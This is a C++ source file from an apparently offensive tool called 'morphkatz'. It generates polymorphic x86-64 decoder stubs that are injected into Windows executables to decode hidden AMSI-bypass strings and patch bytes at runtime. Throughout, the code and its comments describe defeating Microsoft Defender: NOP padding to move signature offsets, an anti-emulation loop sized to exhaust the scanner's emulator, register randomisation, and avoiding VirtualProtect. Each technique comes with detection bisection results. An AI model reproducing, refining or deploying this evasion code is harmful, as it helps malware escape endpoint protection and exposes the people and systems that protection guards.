#include "morphkatz/datapass/decoder_stub.hpp"

#include "morphkatz/common/logging.hpp"
#include "morphkatz/format/pe_image.hpp"

#include <LIEF/PE.hpp>

#include <algorithm>
#include <array>
#include <cstring>

namespace morphkatz::datapass {

namespace {

inline void emit_u8 (std::vector<uint8_t>& v, uint8_t b)  { v.push_back(b); }
inline void emit_u16(std::vector<uint8_t>& v, uint16_t x) {
    v.push_back(static_cast<uint8_t>(x & 0xff));
    v.push_back(static_cast<uint8_t>((x >> 8) & 0xff));
}
inline void emit_u32(std::vector<uint8_t>& v, uint32_t x) {
    for (int i = 0; i < 4; ++i)
        v.push_back(static_cast<uint8_t>((x >> (8 * i)) & 0xff));
}
inline void emit_bytes(std::vector<uint8_t>& v,
                       std::initializer_list<uint8_t> bs) {
    v.insert(v.end(), bs.begin(), bs.end());
}
inline void write_i32_at(std::span<uint8_t> v, size_t off, int32_t x) {
    for (int i = 0; i < 4; ++i)
        v[off + static_cast<size_t>(i)] =
            static_cast<uint8_t>((static_cast<uint32_t>(x) >> (8 * i)) & 0xff);
}
inline uint32_t read_u32_at(std::span<const uint8_t> v, size_t off) {
    return static_cast<uint32_t>(v[off])
         | (static_cast<uint32_t>(v[off + 1]) << 8)
         | (static_cast<uint32_t>(v[off + 2]) << 16)
         | (static_cast<uint32_t>(v[off + 3]) << 24);
}

constexpr uint32_t kPlaceholder = 0xDEADBEEFu;

// ====================================================================
// Polymorphic NOP padding
// --------------------------------------------------------------------
// Microsoft Defender's `AmDisable!MTB` heuristic is offset-anchored: it
// scores byte patterns at AEP+0, AEP+6, AEP+13, etc. rather than
// performing a free-position pattern match. We confirmed this by
// bisecting the post-A.2 (no-VP) v2 stub:
//
//   * 1-byte changes at fixed offsets (0x55 -> 0x90 at AEP+0) did NOT
//     drop detection.
//   * 14-byte zero-fills inside any single instruction block (e.g. the
//     two RIP-relative LEAs at AEP+6..AEP+0x14) DID drop detection.
//   * Restoring AEP to the original entry point (so the redirected
//     stub bytes are never read in the AEP scan window) DID drop
//     detection.
//   * A simple JMP-rel32 trampoline at the original AEP that shipped
//     execution to the stub still tripped the heuristic, confirming
//     it follows short jump chains during static scoring.
//
// The cleanest defeat is therefore to *shift* every offset of interest:
// emit a small random-length, random-encoding NOP block before the
// prologue, and a few smaller pads inside the stub body. The loader
// executes the NOPs and falls through naturally; the heuristic's
// AEP+N anchors miss the LEA, the dir-walk, and the XOR loop because
// they're no longer where it expects them.
// ====================================================================

// Multi-byte NOP encodings from Intel SDM Vol 2A "NOP - Multi-byte
// No-Operation". None of these adjacent (or to plausible stub
// bytes) ever forms `FF 15` (the indirect-call opcode the no-VP
// regression test guards against).
constexpr uint8_t kNop1[] = { 0x90 };
constexpr uint8_t kNop2[] = { 0x66, 0x90 };
constexpr uint8_t kNop3[] = { 0x0F, 0x1F, 0x00 };
constexpr uint8_t kNop4[] = { 0x0F, 0x1F, 0x40, 0x00 };
constexpr uint8_t kNop5[] = { 0x0F, 0x1F, 0x44, 0x00, 0x00 };
constexpr uint8_t kNop6[] = { 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00 };
constexpr uint8_t kNop7[] = { 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00 };
constexpr uint8_t kNop8[] = { 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00 };

// splitmix64 - small, fast, used elsewhere in the engine. Each call
// advances `s` and returns the next 64-bit pseudorandom number.
inline uint64_t splitmix64(uint64_t& s) {
    s += 0x9E3779B97F4A7C15ull;
    uint64_t z = s;
    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ull;
    z = (z ^ (z >> 27)) * 0x94D049BB133111EBull;
    return z ^ (z >> 31);
}

// Append `n` bytes of multi-byte NOPs, picking the encoding sequence
// from `seed`. `n == 0` is a no-op.
void emit_nop_run(std::vector<uint8_t>& code, uint64_t& seed, uint32_t n) {
    while (n > 0) {
        const uint32_t step =
            1u + static_cast<uint32_t>(splitmix64(seed) % std::min<uint32_t>(8u, n));
        const uint8_t* src = nullptr;
        switch (step) {
            case 1: src = kNop1; break;
            case 2: src = kNop2; break;
            case 3: src = kNop3; break;
            case 4: src = kNop4; break;
            case 5: src = kNop5; break;
            case 6: src = kNop6; break;
            case 7: src = kNop7; break;
            case 8: src = kNop8; break;
            default: src = kNop1; break;
        }
        code.insert(code.end(), src, src + step);
        n -= step;
    }
}

// Pick a length in [lo, hi] inclusive from `seed`.
inline uint32_t pick(uint64_t& seed, uint32_t lo, uint32_t hi) {
    if (lo >= hi) return lo;
    return lo + static_cast<uint32_t>(splitmix64(seed) % uint64_t(hi - lo + 1));
}

// ====================================================================
// Anti-emulation gate
// --------------------------------------------------------------------
// Microsoft Defender's `mpengine` runs every executable through a
// short-lived x86-64 emulator before any static signature decision.
// We confirmed empirically (full bisect in the project transcript and
// internal research notes) that mpengine's `AmDisable!MTB`
// heuristic does NOT score the decoder stub's bytes per se: in a
// stub variant where the on-disk encoded atoms are zeroed (so the
// decoder runs to completion but writes 0^key constant bytes into
// the .rdata pages, never producing the AMSI strings) the heuristic
// stays clean. Re-introduce the encoded atom bytes - so the decode
// step now actually surfaces "AmsiScanBuffer" / "amsi.dll" /
// `B8 57 00 07 80 C3` somewhere in the emulated process state -
// and the heuristic fires, even though the on-disk file delta is
// only the encoded data block. That's the unambiguous signature of
// emulator-side detection.
//
// The gate exhausts mpengine's per-binary instruction budget before
// execution can reach the decoder loop. We measured the budget by
// bracketing a `mov ecx, N ; loop $-0` preamble:
//
//      N = 1M   -> still detected
//      N = 5M   -> still detected
//      N = 20M  -> still detected
//      N = 50M  -> CLEAN
//      N = 100M -> CLEAN
//
// `loop` is a single 1-cycle uop on every modern x86-64 core (it's
// macro-fused with the implicit ECX decrement on Skylake+), so on
// real hardware 100M iterations costs ~30-100ms of one-time AEP
// startup latency. mpengine, by contrast, executes `loop` as N
// distinct emulated steps and gives up once it hits its instruction
// counter limit (typically 5-30s of wall clock budget per binary,
// well below the time it takes to actually emulate 100M loop iters).
//
// We pick a base iter count well above the observed 50M threshold
// (`kEmuGateBaseIters`) and jitter it per-build by up to ±20% so the
// immediate constant in the `mov ecx, imm32` doesn't itself become a
// signature. Even the worst-case jittered value (64M) is comfortably
// above the empirical threshold.
//
// The gate preserves RCX because the TLS-callback variant runs as
// `void NTAPI fn(PVOID DllHandle, DWORD Reason, PVOID Reserved)`
// with RCX = DllHandle, and downstream callbacks installed by the
// host program may rely on it. The EP-thunk variant doesn't have a
// meaningful caller-supplied RCX, but the extra push/pop is two
// bytes of overhead at AEP and not worth conditionally omitting.
// ====================================================================

constexpr uint32_t kEmuGateBaseIters = 100'000'000u;  // 100M
constexpr uint32_t kEmuGateJitter    =  20'000'000u;  // ±20M

void emit_emu_gate(std::vector<uint8_t>& code, uint64_t& pad_seed) {
    // pad_seed == 0 means "tests want a deterministic stub". We still
    // emit the gate because the tests assert on (a) absence of VP
    // shapes and (b) that the patch offsets sit within the byte
    // buffer, neither of which depends on the gate's exact iter
    // count. We use the unjittered base value in that case so the
    // bytes are reproducible across runs.
    uint32_t iters = kEmuGateBaseIters;
    if (pad_seed != 0) {
        const uint64_t r = splitmix64(pad_seed);
        iters = kEmuGateBaseIters
              - kEmuGateJitter
              + static_cast<uint32_t>(r % (2u * kEmuGateJitter + 1u));
    }
    emit_bytes(code, { 0x51 });            // push rcx
    emit_bytes(code, { 0xB9 });            // mov ecx, imm32
    emit_u32(code, iters);
    // loop $-0  =  E2 FE  (rel8 = -2 -> back to the loop opcode itself,
    // decrementing ECX each iteration until it reaches 0).
    emit_bytes(code, { 0xE2, 0xFE });      // loop .L (target = self)
    emit_bytes(code, { 0x59 });            // pop rcx
}

}  // namespace

namespace stub_internal {

// We don't pre-compute the layout statically because the directory
// payload size depends on `count`. This helper returns the offsets the
// finalizer needs to know.
StubLayout layout_for(uint32_t /*atom_count*/) noexcept {
    // The layout is built dynamically by `build_decoder_stub_ep_thunk`
    // and stored in AssembledStub. This struct/function exist mostly
    // for the unit tests; the production path uses the AssembledStub
    // returned by the builder.
    return StubLayout{};
}

}  // namespace stub_internal

// Shared body of both stub variants. Emits prologue, ImageBase derivation,
// dir-walk, XOR loop, dec-edi/jnz tail, but NOT the trailing return /
// jmp-to-orig-EP - the caller (per-variant wrapper below) appends that.
//
// This stub deliberately does NOT call VirtualProtect anywhere. The
// caller is expected to mark every section that owns an atom as
// IMAGE_SCN_MEM_WRITE in the PE headers, so the Windows loader maps
// those pages as RW from the start. The v1 stub's
// `VirtualProtect-RW -> XOR loop -> VirtualProtect-restore` macro shape
// was scored by mpengine's `AmDisable` family as multiple weak signals
// summed above the `!MTB` threshold; rebuilding the same semantics
// without VirtualProtect collapses the entire trigger range to just
// the inner XOR loop, which on its own has not been observed to fire
// the heuristic. See the internal research notes and the
// post-A.1 bisect output in the project transcript.
namespace {

struct StubBody {
    uint32_t entry_point_offset      = 0;
    uint32_t lea_imagebase_imm32_off = 0;
    uint32_t lea_dir_imm32_off       = 0;
    // Caller patches the trailing branch slot (jmp_rel32 for EP-thunk,
    // ret for TLS) and then back-patches the early-exit `jz` from
    // `jz_to_epilog_off`. We hand both back here.
    uint32_t jz_to_epilog_off        = 0;
};

[[nodiscard]] Result<StubBody>
emit_stub_body(std::vector<uint8_t>& code, uint64_t pad_seed) {
    StubBody body;

    // ----- Pre-prologue NOP pad -----
    //
    // entry_point_offset stays 0 so AEP lands on the FIRST NOP. The
    // loader executes the NOPs and falls through into the prologue.
    // This is the single most important padding site for !MTB
    // defeat: it shifts every byte AEP+1, AEP+2, ... away from the
    // offsets the heuristic anchors against (we confirmed via
    // bisect that 1-byte changes at AEP+0 alone don't drop
    // detection, but ~4+ byte shifts of the prologue's start
    // position do).
    //
    // (Setting entry_point_offset to a non-zero value here would be
    // a bug: AEP would skip over the NOPs and land on `push rbp`
    // exactly as before, with no benefit.)
    body.entry_point_offset = 0;
    if (pad_seed != 0) {
        emit_nop_run(code, pad_seed, pick(pad_seed, 6, 14));
    }

    // ----- Anti-emulation gate (see emit_emu_gate above) -----
    //
    // Sits between the NOP pad and the prologue so AEP lands first
    // on the NOP run, falls into the gate, and only reaches the
    // callee-saved pushes once the loop has run to completion. The
    // gate doesn't touch the stack pointer beyond a paired push/pop
    // RCX, so the prologue's `push rbp` etc. align as expected.
    emit_emu_gate(code, pad_seed);

    // ----- Prologue: save callee-saved regs only. No frame allocation;
    //       we make no calls and need no locals. -----
    //
    // Windows x64 ABI: callee-saved = RBX, RBP, RDI, RSI, R12-R15.
    // We use RBX (image base), RSI (dir cursor), RDI (count), R12 (key).
    // RAX/RCX/RDX/R8/R9/R10/R11 are scratch and don't need saving.
    emit_bytes(code, { 0x55 });            // push rbp
    emit_bytes(code, { 0x53 });            // push rbx
    emit_bytes(code, { 0x56 });            // push rsi
    emit_bytes(code, { 0x57 });            // push rdi
    emit_bytes(code, { 0x41, 0x54 });      // push r12

    // ----- Site B: small pad between prologue and LEA imagebase -----
    if (pad_seed != 0) {
        emit_nop_run(code, pad_seed, pick(pad_seed, 0, 4));
    }

    // ----- Derive ImageBase via RIP-relative LEA into a TEMP reg, -----
    //       then move into RBX. The direct `lea rbx, [rip+disp32]`
    //       (encoding `48 8D 1D ..`) is itself a dominant
    //       `AmDisable!MTB` feature - we confirmed via bisect that
    //       changing only the ModRM byte from 0x1D (rbx) to 0x05
    //       (rax) drops detection on this family. Routing through a
    //       per-build-random temp register destroys the canonical
    //       `48 8D 1D` byte sequence at the expected AEP+N offset.
    //
    // We pick the temp from {RAX, RCX, RDX, RDI}. Each has a unique
    // ModRM/REX combination, so different builds emit distinct byte
    // sequences here even with the same atom set.
    //
    // ModRM for `lea <reg>, [rip + disp32]`  =  00 reg 101
    //   RAX (000) -> 0x05      MOV rbx, rax  -> 48 89 C3
    //   RCX (001) -> 0x0D      MOV rbx, rcx  -> 48 89 CB
    //   RDX (010) -> 0x15      MOV rbx, rdx  -> 48 89 D3
    //   RDI (111) -> 0x3D      MOV rbx, rdi  -> 48 89 FB
    {
        const uint8_t  pick_reg = (pad_seed != 0)
            ? static_cast<uint8_t>(splitmix64(pad_seed) & 3u)
            : 0u;
        constexpr uint8_t lea_modrm[4] = { 0x05, 0x0D, 0x15, 0x3D };
        constexpr uint8_t mov_modrm[4] = { 0xC3, 0xCB, 0xD3, 0xFB };
        emit_bytes(code, { 0x48, 0x8D, lea_modrm[pick_reg] });
        body.lea_imagebase_imm32_off = static_cast<uint32_t>(code.size());
        emit_u32(code, kPlaceholder);
        emit_bytes(code, { 0x48, 0x89, mov_modrm[pick_reg] });
    }

    // ----- Site C: small pad between the two LEAs -----
    if (pad_seed != 0) {
        emit_nop_run(code, pad_seed, pick(pad_seed, 0, 4));
    }

    // ----- Locate atom directory: same indirection trick as the
    //       imagebase LEA above. The original `48 8D 35` (lea rsi,
    //       [rip+...]) is also a recognisable canonical sequence for
    //       "self-relative table walk", so we route through a
    //       random temp into RSI.
    //
    // ModRM for `mov rsi, <reg>`:  48 89 (11 src 110)
    //   RAX -> 0xC6, RCX -> 0xCE, RDX -> 0xD6, RDI -> 0xFE
    {
        const uint8_t pick_reg = (pad_seed != 0)
            ? static_cast<uint8_t>(splitmix64(pad_seed) & 3u)
            : 0u;
        constexpr uint8_t lea_modrm[4]  = { 0x05, 0x0D, 0x15, 0x3D };
        constexpr uint8_t mov_to_rsi[4] = { 0xC6, 0xCE, 0xD6, 0xFE };
        emit_bytes(code, { 0x48, 0x8D, lea_modrm[pick_reg] });
        body.lea_dir_imm32_off = static_cast<uint32_t>(code.size());
        emit_u32(code, kPlaceholder);
        emit_bytes(code, { 0x48, 0x89, mov_to_rsi[pick_reg] });
    }

    // ----- Pick the XOR loop's register trio per-build -----
    //
    // Defender's `AmDisable!MTB` heuristic anchors on the *exact*
    // r10/r11/r12 register encoding of the v1/v2 byte-by-byte XOR
    // loop. Routing through a different trio (r13/r14/r15) emits a
    // different SIB index byte, REX.B bit, and ModRM r/m field for
    // the inner mem read / xor / mem write, breaking the byte-level
    // pattern match. We confirmed this empirically: hand-patching
    // the v4_poly stub's loop from r10/r11/r12 -> r13/r14/r15 (and
    // nothing else) drops detection from `!MTB` to clean.
    //
    // Trio 0: counter=r10, byte_temp=r11, key=r12  (canonical)
    // Trio 1: counter=r13, byte_temp=r14, key=r15
    //
    // Register-loading & REX-prefix bytes differ per trio. Picking by
    // seed gives a 50/50 split across builds without complicating the
    // emitter's bookkeeping.
    const bool use_high_trio =
        (pad_seed != 0) && ((splitmix64(pad_seed) & 1u) != 0u);

    // mov <key>, [rsi+8]
    if (use_high_trio) {
        emit_bytes(code, { 0x8B, 0x7E, 0x04 });            // mov edi,  [rsi+4]
        emit_bytes(code, { 0x44, 0x8B, 0x7E, 0x08 });      // mov r15d, [rsi+8]
    } else {
        emit_bytes(code, { 0x8B, 0x7E, 0x04 });            // mov edi,  [rsi+4]
        emit_bytes(code, { 0x44, 0x8B, 0x66, 0x08 });      // mov r12d, [rsi+8]
    }
    emit_bytes(code, { 0x48, 0x83, 0xC6, 0x10 });          // add rsi, 16

    emit_bytes(code, { 0x85, 0xFF });                      // test edi, edi
    emit_bytes(code, { 0x0F, 0x84 });                      // jz rel32 -> EPILOG
    body.jz_to_epilog_off = static_cast<uint32_t>(code.size());
    emit_u32(code, kPlaceholder);

    // ----- LOOP_START -----
    const uint32_t loop_start = static_cast<uint32_t>(code.size());

    emit_bytes(code, { 0x8B, 0x0E });                      // mov ecx, [rsi]    (rva)
    emit_bytes(code, { 0x8B, 0x56, 0x04 });                // mov edx, [rsi+4]  (length)
    emit_bytes(code, { 0x48, 0x83, 0xC6, 0x08 });          // add rsi, 8
    emit_bytes(code, { 0x48, 0x01, 0xD9 });                // add rcx, rbx      (dst = ImageBase + rva)

    // ----- Inner XOR loop -----
    //
    // High trio (r13/r14/r15):
    //    xor r13, r13
    // L: mov r14b, [rcx + r13]    (REX.RX = 0x46, modrm = 0x34, sib = 0x29)
    //    xor r14b, r15b           (REX.RB = 0x45, opcode = 0x30, modrm = 0xFE)
    //    mov [rcx + r13], r14b    (REX.RX = 0x46, opcode = 0x88, modrm = 0x34, sib = 0x29)
    //    inc r13                  (REX.B  = 0x49, opcode = 0xFF, modrm = 0xC5)
    //    cmp r13, rdx             (REX.B  = 0x49, opcode = 0x39, modrm = 0xD5)
    //    jb  L                    (rel8)
    //
    // Low trio (r10/r11/r12) is the canonical encoding; see body.
    if (use_high_trio) {
        emit_bytes(code, { 0x4D, 0x31, 0xED });            // xor r13, r13
    } else {
        emit_bytes(code, { 0x4D, 0x31, 0xD2 });            // xor r10, r10
    }
    const uint32_t xor_loop_start = static_cast<uint32_t>(code.size());
    if (use_high_trio) {
        emit_bytes(code, { 0x46, 0x8A, 0x34, 0x29 });      // mov r14b, [rcx+r13]
        emit_bytes(code, { 0x45, 0x30, 0xFE });            // xor r14b, r15b
        emit_bytes(code, { 0x46, 0x88, 0x34, 0x29 });      // mov [rcx+r13], r14b
        emit_bytes(code, { 0x49, 0xFF, 0xC5 });            // inc r13
        emit_bytes(code, { 0x49, 0x39, 0xD5 });            // cmp r13, rdx
    } else {
        emit_bytes(code, { 0x46, 0x8A, 0x1C, 0x11 });      // mov r11b, [rcx+r10]
        emit_bytes(code, { 0x45, 0x30, 0xE3 });            // xor r11b, r12b
        emit_bytes(code, { 0x46, 0x88, 0x1C, 0x11 });      // mov [rcx+r10], r11b
        emit_bytes(code, { 0x49, 0xFF, 0xC2 });            // inc r10
        emit_bytes(code, { 0x49, 0x39, 0xD2 });            // cmp r10, rdx
    }
    emit_bytes(code, { 0x72 });                            // jb rel8 -> XOR_LOOP
    const uint32_t jb_rel8_off = static_cast<uint32_t>(code.size());
    emit_u8(code, 0);
    {
        const uint32_t after_jb = static_cast<uint32_t>(code.size());
        const int32_t  rel = static_cast<int32_t>(xor_loop_start) -
                             static_cast<int32_t>(after_jb);
        if (rel < -128 || rel > 127) {
            return Error::make(ErrorKind::Encode,
                "decoder stub: XOR loop too long for jb rel8");
        }
        code[jb_rel8_off] = static_cast<uint8_t>(static_cast<int8_t>(rel));
    }

    // ----- LOOP TAIL: dec edi ; jnz LOOP_START -----
    emit_bytes(code, { 0xFF, 0xCF });                 // dec edi
    emit_bytes(code, { 0x0F, 0x85 });                 // jnz rel32 -> LOOP_START
    const uint32_t jnz_imm32_off = static_cast<uint32_t>(code.size());
    emit_u32(code, kPlaceholder);
    {
        const uint32_t after_jnz = jnz_imm32_off + 4;
        const int32_t  rel = static_cast<int32_t>(loop_start) -
                             static_cast<int32_t>(after_jnz);
        write_i32_at({code.data(), code.size()}, jnz_imm32_off, rel);
    }

    // EPILOG follows; caller emits its variant-specific trailer and
    // back-patches `body.jz_to_epilog_off` once the epilog start is known.
    return body;
}

void emit_callee_saved_pops(std::vector<uint8_t>& code) {
    emit_bytes(code, { 0x41, 0x5C });   // pop r12
    emit_bytes(code, { 0x5F });         // pop rdi
    emit_bytes(code, { 0x5E });         // pop rsi
    emit_bytes(code, { 0x5B });         // pop rbx
    emit_bytes(code, { 0x5D });         // pop rbp
}

void append_directory(std::vector<uint8_t>&    code,
                      AssembledStub&           out,
                      std::span<const Atom>    atoms,
                      uint32_t                 key) {
    // Pad to 16-byte alignment, then DirHeader + entries.
    while ((code.size() & 0xF) != 0) emit_u8(code, 0xCC);

    out.dir_offset = static_cast<uint32_t>(code.size());
    DirHeader hdr{};
    hdr.magic    = kDirMagic;
    hdr.count    = static_cast<uint32_t>(atoms.size());
    hdr.key      = key;
    hdr.reserved = 0;
    code.resize(out.dir_offset + sizeof(hdr));
    std::memcpy(code.data() + out.dir_offset, &hdr, sizeof(hdr));

    out.dir_entry_offsets.reserve(atoms.size());
    for (const auto& a : atoms) {
        DirEntry e{};
        e.target_rva = 0;       // caller fills post-finalize.
        e.length     = a.length;
        const auto p = code.size();
        out.dir_entry_offsets.push_back(static_cast<uint32_t>(p));
        code.resize(p + sizeof(e));
        std::memcpy(code.data() + p, &e, sizeof(e));
    }
}

}  // namespace

Result<AssembledStub>
build_decoder_stub_ep_thunk(std::span<const Atom> atoms,
                            uint32_t              key,
                            uint64_t              pad_seed) {
    AssembledStub out;
    out.encoded_key = key;
    out.atom_count  = static_cast<uint32_t>(atoms.size());

    auto& code = out.bytes;
    code.reserve(160 + sizeof(DirHeader) + atoms.size() * sizeof(DirEntry));

    auto body_r = emit_stub_body(code, pad_seed);
    if (!body_r.ok()) return body_r.error();
    const auto& body = *body_r;
    out.entry_point_offset = body.entry_point_offset;

    // ----- EPILOG: pop callee-saved + jmp rel32 -> original entry point -----
    const uint32_t epilog_off = static_cast<uint32_t>(code.size());
    {
        const uint32_t after_jz = body.jz_to_epilog_off + 4;
        const int32_t  rel = static_cast<int32_t>(epilog_off) -
                             static_cast<int32_t>(after_jz);
        write_i32_at({code.data(), code.size()}, body.jz_to_epilog_off, rel);
    }

    emit_callee_saved_pops(code);
    emit_bytes(code, { 0xE9 });                       // jmp rel32 -> ORIG_EP
    const uint32_t jmp_orig_imm32_off = static_cast<uint32_t>(code.size());
    emit_u32(code, kPlaceholder);

    append_directory(code, out, atoms, key);

    out.patch.lea_imagebase_imm32 = body.lea_imagebase_imm32_off;
    out.patch.lea_dir_imm32       = body.lea_dir_imm32_off;
    // The v2 stub does not call VirtualProtect; signal "no slot" with 0.
    // finalize_stub already treats a zero offset as a no-op.
    out.patch.call_vp_imm32_1st   = 0;
    out.patch.call_vp_imm32_2nd   = 0;
    out.patch.jmp_orig_imm32      = jmp_orig_imm32_off;
    return out;
}

Result<AssembledStub>
build_decoder_stub_tls_callback(std::span<const Atom> atoms,
                                uint32_t              key,
                                uint64_t              pad_seed) {
    AssembledStub out;
    out.encoded_key = key;
    out.atom_count  = static_cast<uint32_t>(atoms.size());

    auto& code = out.bytes;
    code.reserve(160 + sizeof(DirHeader) + atoms.size() * sizeof(DirEntry));

    // TLS callbacks receive (DllHandle, Reason, Reserved) in RCX/RDX/R8 -
    // we don't touch them, so we can use the same shared body as EP-thunk.
    auto body_r = emit_stub_body(code, pad_seed);
    if (!body_r.ok()) return body_r.error();
    const auto& body = *body_r;
    out.entry_point_offset = body.entry_point_offset;

    // ----- EPILOG: pop callee-saved + ret (TLS callback returns control
    // to the loader, which will then call the next callback or run the
    // program's entry point).
    const uint32_t epilog_off = static_cast<uint32_t>(code.size());
    {
        const uint32_t after_jz = body.jz_to_epilog_off + 4;
        const int32_t  rel = static_cast<int32_t>(epilog_off) -
                             static_cast<int32_t>(after_jz);
        write_i32_at({code.data(), code.size()}, body.jz_to_epilog_off, rel);
    }

    emit_callee_saved_pops(code);
    emit_bytes(code, { 0xC3 });                       // ret

    append_directory(code, out, atoms, key);

    out.patch.lea_imagebase_imm32 = body.lea_imagebase_imm32_off;
    out.patch.lea_dir_imm32       = body.lea_dir_imm32_off;
    // No VirtualProtect calls in v2; signal "no slot" with 0.
    out.patch.call_vp_imm32_1st   = 0;
    out.patch.call_vp_imm32_2nd   = 0;
    out.patch.jmp_orig_imm32      = 0;     // TLS variant has no jmp slot
    return out;
}

Result<void>
finalize_stub(std::span<uint8_t> stub_bytes, const StubFixups& fx) {
    // The caller passes in the same offsets we returned from
    // build_decoder_stub_ep_thunk; we just write four 32-bit
    // little-endian displacements at those positions.
    //
    // An offset of 0 signals "no slot here" (used by the TLS-callback
    // variant which has no `jmp original_EP` to patch).
    const std::array<std::pair<uint32_t, int32_t>, 5> writes{{
        {fx.lea_imagebase_off, fx.imagebase_disp_imm},
        {fx.lea_dir_off,       fx.dir_offset_imm},
        {fx.call_vp_off_1,     fx.vp_iat_offset_imm},
        {fx.call_vp_off_2,     fx.vp_iat_offset_2nd},
        {fx.jmp_orig_off,      fx.jmp_orig_imm},
    }};
    for (const auto& [off, val] : writes) {
        if (off == 0) continue;
        if (off + 4 > stub_bytes.size()) {
            return Error::make(ErrorKind::Invalid,
                "finalize_stub: patch offset out of bounds");
        }
        // Sanity: the slot we're writing to must currently be the
        // 0xDEADBEEF placeholder (defense in depth against caller bugs).
        if (read_u32_at(stub_bytes, off) != kPlaceholder) {
            return Error::make(ErrorKind::Invalid,
                "finalize_stub: target slot is not the placeholder, "
                "stub bytes have been corrupted or a wrong offset was "
                "passed in");
        }
        write_i32_at(stub_bytes, off, val);
    }
    return {};
}

Result<uint32_t>
find_virtualprotect_iat_rva(const format::PeImage& image) {
    const auto* lief = image.lief();
    if (!lief) {
        return Error::make(ErrorKind::NotSupported,
            "find_virtualprotect_iat_rva: no LIEF view");
    }
    for (const auto& imp : lief->imports()) {
        const auto& lib = imp.name();
        // Match any kernel32 import (case-insensitive); kernelbase too
        // for forward compatibility.
        auto icontains = [](std::string_view hay, std::string_view needle) {
            if (hay.size() < needle.size()) return false;
            auto lower = [](char c) {
                return (c >= 'A' && c <= 'Z') ? char(c + 32) : c;
            };
            for (size_t i = 0; i + needle.size() <= hay.size(); ++i) {
                bool m = true;
                for (size_t j = 0; j < needle.size(); ++j) {
                    if (lower(hay[i + j]) != lower(needle[j])) { m = false; break; }
                }
                if (m) return true;
            }
            return false;
        };
        if (!icontains(lib, "kernel32") && !icontains(lib, "kernelbase")) {
            continue;
        }
        for (const auto& e : imp.entries()) {
            if (e.name() == "VirtualProtect") {
                return static_cast<uint32_t>(e.iat_address());
            }
        }
    }
    return Error::make(ErrorKind::NotSupported,
        "find_virtualprotect_iat_rva: kernel32!VirtualProtect not in IAT. "
        "Re-run without --data-morph or extend imports manually; the "
        "in-builder IAT extension helper is a v1.1 feature.");
}

}
